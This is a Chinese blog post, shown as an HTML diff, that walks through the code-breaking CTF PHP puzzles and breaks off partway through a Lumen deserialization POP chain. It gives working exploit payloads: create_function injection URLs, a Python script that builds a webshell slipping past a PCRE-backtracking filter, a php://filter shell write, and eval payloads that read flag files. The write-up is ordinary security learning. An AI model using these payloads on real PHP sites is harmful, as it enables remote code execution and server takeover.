@@ -6,15 +6,27 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Tag: 代码审计 | yhbl&#39;note</title>
+  <title>CODEBREAKING_Learn | yhbl&#39;note</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="yhbl&#39;note">
-<meta property="og:url" content="http://yoursite.com/tags/代码审计/index.html">
+  <meta name="description" content="跳入了代码审计的深坑中…">
+<meta name="keywords" content="代码审计">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CODEBREAKING_Learn">
+<meta property="og:url" content="http://yoursite.com/2019/04/08/CODEBREAKING-Learn/index.html">
 <meta property="og:site_name" content="yhbl&#39;note">
+<meta property="og:description" content="跳入了代码审计的深坑中…">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/home/yhbl/.config/Typora/typora-user-images/1547467303307.png">
+<meta property="og:image" content="http://yoursite.com/home/yhbl/.config/Typora/typora-user-images/1547468427670.png">
+<meta property="og:image" content="http://yoursite.com/home/yhbl/.config/Typora/typora-user-images/1547468449380.png">
+<meta property="og:image" content="http://yoursite.com/home/yhbl/.config/Typora/typora-user-images/1550057997351.png">
+<meta property="og:image" content="http://yoursite.com/home/yhbl/.config/Typora/typora-user-images/1550059883858.png">
+<meta property="og:image" content="http://yoursite.com/home/yhbl/.config/Typora/typora-user-images/1550063227488.png">
+<meta property="og:updated_time" content="2019-04-08T03:34:25.775Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="yhbl&#39;note">
+<meta name="twitter:title" content="CODEBREAKING_Learn">
+<meta name="twitter:description" content="跳入了代码审计的深坑中…">
+<meta name="twitter:image" content="http://yoursite.com/home/yhbl/.config/Typora/typora-user-images/1547467303307.png">
   
     <link rel="alternative" href="/atom.xml" title="yhbl&#39;note" type="application/atom+xml">
   
@@ -146,36 +158,122 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
+            <article id="post-CODEBREAKING-Learn" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
   
+    <h1 class="article-title" itemprop="name">
+      CODEBREAKING_Learn
+    </h1>
   
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2019" class="archive-year">2019</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/04/08/CODEBREAKING-Learn/" class="archive-article-date">
+
+        
+        <!-- 显示阅读和评论数 -->
+        
+        <a href="/2019/04/08/CODEBREAKING-Learn/" class="archive-article-date">
   	<time datetime="2019-04-08T03:28:46.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-04-08</time>
 </a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/04/08/CODEBREAKING-Learn/">CODEBREAKING_Learn</a>
-    </h1>
-  
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>跳入了代码审计的深坑中…</p>
+<a id="more"></a>
+<h2 id="easy-function"><a href="#easy-function" class="headerlink" title="easy - function"></a>easy - function</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$action = $_GET[<span class="string">'action'</span>] ?? <span class="string">''</span>;</span><br><span class="line">$arg = $_GET[<span class="string">'arg'</span>] ?? <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9_]*$/isD'</span>, $action)) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $action(<span class="string">''</span>, $arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>本题要点：<code>\</code>是默认命名空间可以省略，<code>create_function</code>函数特性</p>
+<p>思路$action传递函数名，$arg传递参数，但是首先需要绕过正则判断，尝试过%00，%0a都没有效果，然后fuzz到%5c完成绕过。</p>
+<blockquote>
+<p>code-breaking puzzles第一题，function，为什么函数前面可以加一个<code>%5c</code>？<br>其实简单的不行，php里默认命名空间是’<code>\</code>，所有原生函数和类都在这个命名空间中。普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写<code>\function_name()</code> 这样调用函数，则其实是写了一个绝对路径。<br>如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。</p>
+</blockquote>
+<p>就是<code>\</code>在php中表示默认的命名空间，比如写一些类的时候会在开头写</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">db</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Exception</span>;</span><br></pre></td></tr></table></figure>
+<p>接下来需要找到一个函数符合第一个参数可以为空，并且能够执行代码，通过翻看手册找到<code>create_function</code>函数。</p>
+<p><code>create_function</code>在7.2版本中已经弃用，但还是能够使用，我对该函数的理解，相当于创建了一个匿名函数，格式如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="params">(arg)</span></span>&#123;</span><br><span class="line">    code;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>利用该函数进行注入，<code>create_function($a，&quot;echo &#39;123456&#39;;}system(&#39;ls&#39;);{&quot;)</code>,其实形式为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="params">($a)</span></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'123456'</span>;&#125;</span><br><span class="line">    system(<span class="string">'ls'</span>);&#123;      <span class="comment">//通过闭合花括号完成注入，或者利用/*进行多行注释,或者利用//</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>最后的payload为<code>http://51.158.75.42:8087/?action=%5ccreate_function&amp;arg=}var_dump(scandir(%22../%22));{</code>  用来查看目录树，因为system被过滤了</p>
+<p><code>http://51.158.75.42:8087/?action=%5ccreate_function&amp;arg=}var_dump(file_get_contents(%22../flag_h0w2execute_arb1trary_c0de%22));{</code>  读取flag</p>
+<h2 id="easy-pcrewaf"><a href="#easy-pcrewaf" class="headerlink" title="easy - pcrewaf"></a>easy - pcrewaf</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">'/&lt;\?.*[(`;?&gt;].*/is'</span>, $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_FILES)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(show_source(<span class="keyword">__FILE__</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user_dir = <span class="string">'data/'</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">$data = file_get_contents($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line"><span class="keyword">if</span> (is_php($data)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"bad request"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    @mkdir($user_dir, <span class="number">0755</span>);</span><br><span class="line">    $path = $user_dir . <span class="string">'/'</span> . random_int(<span class="number">0</span>, <span class="number">10</span>) . <span class="string">'.php'</span>;</span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $path);</span><br><span class="line"></span><br><span class="line">    header(<span class="string">"Location: $path"</span>, <span class="keyword">true</span>, <span class="number">303</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>本题要点：php PCRE正则匹配的回溯次数限制</p>
+<p>这道题目的难点是绕过<code>is_php</code>函数的正则匹配<code>preg_match(&#39;/&lt;\?.*[(`;?&gt;].*/is&#39;, $data)</code></p>
+<p>这里利用了php进行正则匹配时进行回溯的次数限制，首先了解一下php进行正则匹配时的流程。</p>
+<blockquote>
+<ul>
+<li>DFA: 从起始状态开始，一个字符一个字符地读取输入串，并根据正则来一步步确定至下一个转移状态，直到匹配不上或走完整个输入</li>
+<li>NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态</li>
+</ul>
+</blockquote>
+<p>php的PCRE库使用的就是NFA的正则引擎，就会涉及到回溯的一个过程</p>
+<p><img src="/home/yhbl/.config/Typora/typora-user-images/1547467303307.png" alt="1547467303307"></p>
+<p>当匹配到<code>.*</code>的时候读入所有字符，然后从最后开始进行回溯匹配，当匹配到<code>;</code>时完成匹配否则继续回溯。在php中有最大的匹配回溯次数，php5.2及之前这个次数为100000，之后一直到如今的7.2都是1000000</p>
+<p><img src="/home/yhbl/.config/Typora/typora-user-images/1547468427670.png" alt="1547468427670"></p>
+<p><img src="/home/yhbl/.config/Typora/typora-user-images/1547468449380.png" alt="1547468449380"></p>
+<p>当回溯的次数超过这个限制的时候，会返回一个<code>false</code> （匹配成功返回<code>1</code>，匹配失败返回的是<code>0</code>）</p>
+<p>只是用if进行判断的话完全可以使函数返回<code>false</code>来进行绕过，即上传的文件内容经过构造使回溯次数超过1000*1000次。</p>
+<p>POC为</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">	str_1 = <span class="string">'a'</span>*<span class="number">1000</span>*<span class="number">1000</span></span><br><span class="line">	str_res = <span class="string">'&lt;?php echo "aaa";system($_GET["b"]);eval($_GET["a"]); /*'</span> + str_1 +<span class="string">'*/'</span></span><br><span class="line">	file_out = open(<span class="string">"file_out.txt"</span>,<span class="string">"w+"</span>)</span><br><span class="line">	file_out.write(str_res)</span><br><span class="line">	<span class="comment"># print(str_res)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure>
+<p>然后上传生成的文件即可成功写入shell</p>
+<h2 id="easy-phpmagic"><a href="#easy-phpmagic" class="headerlink" title="easy - phpmagic"></a>easy - phpmagic</h2><p>题目要点：<code>php://filter/write=convert.base64-decode/resource=/var/www/html/data/tata.php/.</code>  在<code>file_put_contents</code>方法中充当文件名写入shell ,<code>/.</code>文件后缀绕过过滤</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'read-source'</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(show_source(<span class="keyword">__FILE__</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">define(<span class="string">'DATA_DIR'</span>, dirname(<span class="keyword">__FILE__</span>) . <span class="string">'/data/'</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!is_dir(DATA_DIR)) &#123;</span><br><span class="line">    mkdir(DATA_DIR, <span class="number">0755</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">chdir(DATA_DIR);</span><br><span class="line"></span><br><span class="line">$domain = <span class="keyword">isset</span>($_POST[<span class="string">'domain'</span>]) ? $_POST[<span class="string">'domain'</span>] : <span class="string">''</span>;</span><br><span class="line">$log_name = <span class="keyword">isset</span>($_POST[<span class="string">'log'</span>]) ? $_POST[<span class="string">'log'</span>] : date(<span class="string">'-Y-m-d'</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST) &amp;&amp; $domain):</span><br><span class="line">    $command = sprintf(<span class="string">"dig -t A -q %s"</span>, escapeshellarg($domain));</span><br><span class="line">    $output = shell_exec($command);</span><br><span class="line"></span><br><span class="line">    $output = htmlspecialchars($output, ENT_HTML401 | ENT_QUOTES);</span><br><span class="line"></span><br><span class="line">    $log_name = $_SERVER[<span class="string">'SERVER_NAME'</span>] . $log_name;</span><br><span class="line">    <span class="keyword">if</span>(!in_array(pathinfo($log_name, PATHINFO_EXTENSION), [<span class="string">'php'</span>, <span class="string">'php3'</span>, <span class="string">'php4'</span>, <span class="string">'php5'</span>, <span class="string">'phtml'</span>, <span class="string">'pht'</span>], <span class="keyword">true</span>)) &#123;</span><br><span class="line">        file_put_contents($log_name, $output);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> $output;</span><br><span class="line"><span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>通过分析源代码发现在执行<code>dig</code>命令之后目标域名会回显,然后把命令执行结果写入到目标文件中,同时会对结果中的尖括号进行实体编码,然后<code>!in_array(pathinfo($log_name, PATHINFO_EXTENSION), [&#39;php&#39;, &#39;php3&#39;, &#39;php4&#39;, &#39;php5&#39;, &#39;phtml&#39;, &#39;pht&#39;], true)</code>限制了文件的扩展名.</p>
+<p>通过以上的分析想要写入shell必须对写入的内容进行编码,然后在进行保存的时候进行解码,为了使解码后的内容不影响shell执行可以采用base64对内容进行编码.根据<code>file_put_contents</code>能够支持<code>php://filter</code>可以利用<code>php://filter/write=convert.base64-decode/resource=xxx.php</code>充当文件名完成shell执行代码的写入,可以利用<code>$_SERVER[&#39;SERVER_NAME&#39;]</code>帮助构造语句.根据文档中的解释如果配置错误可以有客户端提供主机名例如使用<code>host</code>参数,然后就可以通过拼接构造最后的语句.</p>
+<p><img src="/home/yhbl/.config/Typora/typora-user-images/1550057997351.png" alt="1550057997351"></p>
+<p>最后的难点是绕过后缀名的限制,通过查找资料发现在文件后缀后面添加<code>/.</code>可以绕过限制.</p>
+<h2 id="easy-phplimit"><a href="#easy-phplimit" class="headerlink" title="easy - phplimit"></a>easy - phplimit</h2><p>tips: 绕过正则限制(只允许多重函数嵌套,并且函数参数为空),通过其他方式传递参数,通过session_id或者get_defined_vars(),或者利用文件操作函数进行翻越目录</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'code'</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>该个正则的意思为匹配只存在字母数字以及下划线组成的函数名并且参数为空,<code>?R</code>表示递归整个模式,例如<code>a(aaa(aaaa(ssss())))</code>这样的形式.</p>
+<p>根据这个限制我们只能使用空参数的函数,通过学习师傅们的解决方法,了解到可以使用<code>get_defined_vars</code>获取全局的已经定义的变量.</p>
+<p><img src="/home/yhbl/.config/Typora/typora-user-images/1550059883858.png" alt="1550059883858"></p>
+<p>然后通过数组操作函数<code>next</code>和<code>current</code>来选取需要的参数值.</p>
+<p>最后的payload为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">code=eval(next(current(get_defined_vars())));</span><br><span class="line">&amp;b=print_r(scandir(&apos;../&apos;));print_r(file_get_contents(&apos;../flag_phpbyp4ss&apos;));</span><br></pre></td></tr></table></figure>
+<p>其他解法:</p>
+<p>通过session_id来进行命令执行,执行<code>session_id(session_start()</code>后会返回PHPSESSID的值,然后就可以通过PHPSESSID来传递参数,但是PHPSESSID不允许出现<code>[a-zA-Z0-9_]</code>之外的字符所以可以通过<code>hex2bin</code>完成转码.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /?code=eval(hex2bin(session_id(session_start())));</span><br><span class="line"></span><br><span class="line">PHPSESSID=7072696e745f722866696c655f6765745f636f6e74656e747328272e2e2f666c61675f7068706279703473732729293b</span><br></pre></td></tr></table></figure>
+<h2 id="lumenserial"><a href="#lumenserial" class="headerlink" title="lumenserial"></a>lumenserial</h2><p>tips : pop chains </p>
+<p>本着学习的态度进行复现</p>
+<p>首先了解一下这个框架<code>lumen</code>,通过<code>composer install</code>安装一下依赖,然后查看一下路由.</p>
+<p><img src="/home/yhbl/.config/Typora/typora-user-images/1550063227488.png" alt="1550063227488"></p>
+<p>然后找到<code>app/Http/Controllers/EditorController.php</code>,查看里面编辑器的功能.</p>
+<p>然后可以利用<code>file_get_contents</code>来进行phar反序列化，文件上传点比较好找，允许直接上传图片.</p>
+<p>根据师傅们的操作找的是<code>Catchimage</code>,在此操作中存在下列代码:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">download</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       $maxSize = <span class="keyword">$this</span>-&gt;config[<span class="string">'catcherMaxSize'</span>];</span><br><span class="line">       $limitExtension = array_map(<span class="function"><span class="keyword">function</span> <span class="params">($ext)</span> </span>&#123;</span><br><span class="line">           <span class="keyword">return</span> ltrim($ext, <span class="string">'.'</span>);</span><br><span class="line">       &#125;, <span class="keyword">$this</span>-&gt;config[<span class="string">'catcherAllowFiles'</span>]);</span><br><span class="line">       $allowTypes = array_map(<span class="function"><span class="keyword">function</span> <span class="params">($ext)</span> </span>&#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="string">"image/&#123;$ext&#125;"</span>;</span><br><span class="line">       &#125;, $limitExtension);</span><br><span class="line"></span><br><span class="line">       $content = file_get_contents($url);</span><br><span class="line">       $img = getimagesizefromstring($content);</span><br><span class="line">       ....</span><br></pre></td></tr></table></figure>
+<h3 id="pop-chain"><a href="#pop-chain" class="headerlink" title="pop chain"></a>pop chain</h3><p>phar反序列化第一步主要找两个魔术方法入口: <code>__destruct|__wakeup</code>,然后寻找危险函数.</p>
+<h3 id="PendingBroadcast"><a href="#PendingBroadcast" class="headerlink" title="PendingBroadcast"></a>PendingBroadcast</h3><p><code>illuminate/broadcasting/PendingBroadcast.php:55</code>里的<code>__destruct</code>看到调用了<code>events</code>的<code>dispatch</code>。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;events-&gt;dispatch(<span class="keyword">$this</span>-&gt;event);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>常规的一些类中<code>dispatch</code>里没有危险函数，所以需要找其他类的<code>__call</code>方法。</p>
+<h3 id="ValidGenerator"><a href="#ValidGenerator" class="headerlink" title="ValidGenerator"></a>ValidGenerator</h3><p><code>fzaninotto/faker/src/Faker/ValidGenerator.php:52</code>里的<code>__call</code>方法调用了个两个动态调用函数。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        $res = call_user_func_array(<span class="keyword">array</span>(<span class="keyword">$this</span>-&gt;generator, $name), $arguments);</span><br><span class="line">        $i++;</span><br><span class="line">        <span class="keyword">if</span> ($i &gt; <span class="keyword">$this</span>-&gt;maxRetries) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> \OverflowException(sprintf(<span class="string">'Maximum retries of %d reached without finding a valid value'</span>, <span class="keyword">$this</span>-&gt;maxRetries));</span><br><span class="line">        &#125;</span><br><span class="line">        var_dump(<span class="keyword">$this</span>-&gt;validator);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        var_dump($res);</span><br><span class="line">    &#125; <span class="keyword">while</span> (!call_user_func(<span class="keyword">$this</span>-&gt;validator, $res));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里的<code>$name</code>传入的是<code>dispatch</code>,<code>$arguments</code>传入的是参数数组.</p>
+<p>然后执行do循环里面的代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$res = call_user_func_array(<span class="keyword">array</span>(<span class="keyword">$this</span>-&gt;generator, $name), $arguments);</span><br></pre></td></tr></table></figure>
+<p>这时候<code>$this-&gt;generator</code>与<code>$arguments</code>是可控的,<code>$this-&gt;generator</code>可以传入一个可控的类,进而控制返回值使<code>$res</code>可控,然后执行while判定条件中的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func(<span class="keyword">$this</span>-&gt;validator, $res)</span><br></pre></td></tr></table></figure>
+<h3 id="Generator"><a href="#Generator" class="headerlink" title="Generator"></a>Generator</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//fzaninotto/faker/src/Faker/Generator.php:277</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($method, $attributes)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;format($method, $attributes);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//format()</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">format</span><span class="params">($formatter, $arguments = array<span class="params">()</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> call_user_func_array(<span class="keyword">$this</span>-&gt;getFormatter($formatter), $arguments);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//getFormatter()</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFormatter</span><span class="params">($formatter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;formatters[$formatter])) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;formatters[$formatter];</span><br><span class="line">    &#125;</span><br><span class="line">    ....</span><br></pre></td></tr></table></figure>
+<p>开始的<code>$method</code>同样不可控参数值为<code>dispatch</code>,<code>$attributes</code>传递的是上一个的参数数组.</p>
+<p>在<code>getFormatter()</code>中<code>$this-&gt;formatters</code>是可以通过反序列化控制的，这样，就可以传入一个我们想要的数组，然后触发对应类的函数。</p>
+<p>然后由于<code>$arguments</code>的原因，现在的pop链还不能利用。这里选择了在<code>Generator</code>类中再次调用<code>Generator</code>类，嵌套调用。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$g2-&gt;formatters = <span class="keyword">array</span>(<span class="string">'yhbl'</span> =&gt; $evalobj);</span><br><span class="line"></span><br><span class="line">$g1-&gt;formatters = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">"dispatch"</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">        $g2, </span><br><span class="line">        <span class="string">"getFormatter"</span>,</span><br><span class="line">    )</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+<p>首先执行g1-&gt;getFormatter(“dispatch”),然后调用g2-&gt;getFormatter($arguments),然后控制formatters数组返回任意类,从而赋值给<code>$res</code>.</p>
+<h3 id="StaticInvocation"><a href="#StaticInvocation" class="headerlink" title="StaticInvocation"></a>StaticInvocation</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">phpunit\phpunit\src\Framework\MockObject\Stub\ReturnCallback.php:<span class="number">26</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">invoke</span><span class="params">(Invocation $invocation)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> \call_user_func_array(<span class="keyword">$this</span>-&gt;callback, $invocation-&gt;getParameters());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里调用了<code>call_user_func_array</code>并且两个参数都是反序列化可控的。由于<code>Invocation</code>只是个接口。找到具体的实现类即可。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StaticInvocation</span> <span class="keyword">implements</span> <span class="title">Invocation</span>, <span class="title">SelfDescribing</span></span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getParameters</span><span class="params">()</span>: <span class="title">string</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;parameters;</span><br><span class="line">    &#125;</span><br><span 